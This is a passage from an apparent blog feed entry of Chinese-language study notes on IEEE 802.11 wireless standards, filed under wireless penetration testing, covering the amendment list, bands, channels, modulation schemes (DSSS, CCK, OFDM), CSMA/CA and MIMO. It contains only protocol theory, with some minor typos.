Frames<br>IEEE 802.1 1y 3650-2700 MHz Operation in the US<br>IEEE 802.1 1z Direct Link Setup (DLS) Extensions<br>IEEE 802.1 1mb Maintenance of the Standard<br>IEEE 802.1 1aa Robust Streaming of Audio Video Transport Streams<br>IEEE 802.1 1ac Very High Throughput &lt; 6 GHz<br>IEEE 802.1 1ad Very High Throughput, 60 GHz<br>IEEE 802.1 1ae QoS Management<br>IEEE 802.1 1af TV Whitespace<br>IEEE 802.1 1ah Sub 1 GHz<br>IEEE 802.1 1ai Fast Initial Link Setup</p><blockquote><p>日常使用</p></blockquote><p>IEEE 802.1 1 The Original WLAN Standard - 1 Mbit/s and 2 Mbit/w,2.4 GHz RF and IR<br>IEEE 802.1 1a Up to 54 Mbit/s,5GHz<br>IEEE 802.1 1b 802.11 Enhancerments to Support 5.5 Mbit/s and 11 Mbit/s<br>IEEE 802.1 1g 54 Mbit/s,2.4 GHz<br>IEEE 802.1 1i Enhanced Security<br>IEEE 802.1 1n Higher Throughput Using Multiple Input,Multiple Output (MIMO) Antennas</p><h4 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a><strong>802.11</strong></h4><p>发布于1997年<br>速率1Mbps或2Mbps<br>红外线传输介质(未实现)<br>无线射频信号编码(调制)(radio frequencies)<br>    Direct-Sequence Spread-Spectrum(DSSS)–十序扩频<br>    Frequency Hopping Spread-Spectrum(FHSS)–跳频扩频<br>媒体访问方式—-CSMA/CA c=b+log2(1+s/n)<br>    根据算法侦听一定时长<br>    发送数据前发包声明<br>Request to Send/Clear to Send(RTS/CTS)</p><h4 id="802-11b"><a href="#802-11b" class="headerlink" title="802.11b"></a><strong>802.11b</strong></h4><p>Complermentary Code Keying(CCK)–补充代码键<br>    5.5 and 1 1Mbit/s<br>    2.4GHz band (2.4GHz-2.485GHz)<br>    14个重叠的信道channets<br>    每个信道22MHz带宽<br>    只有三个完全不重叠的信道<br>美国–1 to 11(2.412 GHz–2.462 GHz)<br>欧洲–1 to 13(2.412 GHz–2.472 GHz)<br>日本–1 to 14(2.412 GHz–2.485 GHz)</p><h4 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a><strong>802.11a</strong></h4><p>与802.1 1b几乎同时发布<br>    因设备价格问题一直没有得到广泛使用<br>使用5GHz带宽<br>    2.4GHz带宽干扰源多(微波,蓝牙,无线电话)<br>    5GHz频率有更多带宽空间,可容纳更多不重叠的信道<br>    Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法<br>        正交频分复用技术<br>    更高速率54Mbps,每个信道20MHz带宽<br>    变频<br>        5.15-5.35 GHz室内<br>        5.7-5.8 GHz室外</p><h4 id="802-1-1g"><a href="#802-1-1g" class="headerlink" title="802.1 1g"></a><strong>802.1 1g</strong></h4><p>2.4GHz 频段<br>Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法<br>与802.11a速率相同<br>可全局降速 向后兼容802.11b,并切换为CCK信号调制方法<br>每个信道20/22MHz带宽</p><h4 id="802-1-1n"><a href="#802-1-1n" class="headerlink" title="802.1 1n"></a><strong>802.1 1n</strong></h4><p>2.4或5GHz频率<br>300Mbps最高600Mbps<br>Multiple-Input Multiple-Output (MIMO)多进多出通信技术    #多个天线<br>多天线,多无线电波,独立收发信号<br>可以使用40MHz信道带宽是数据传输速率翻倍<br>全802.11n设备网络中,可以使用新报文格式,使速率达到最大<br>每个信道20/40MHz带宽</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;无线技术变化快,难度大&lt;br&gt;行业迅猛发展&lt;br&gt;互联网的重要入口&lt;br&gt;边界模糊&lt;br&gt;安全实施缺失而且困难&lt;br&gt;对技术不了解而造成配置不当&lt;br&gt;企业网络私自接入AP破坏网络边界&lt;br&gt;aircrack-ng suite作者写过一本关于无线渗透的书&lt;/p&gt;
-&lt;h4 i
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="无线渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
-    
-      <category term="无线技术理论" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/"/>
-    
-    
-      <category term="802.11" scheme="http://c.cat.plus/tags/802-11/"/>
-    
-      <category term="无线协议" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE/"/>
     
   </entry>
   
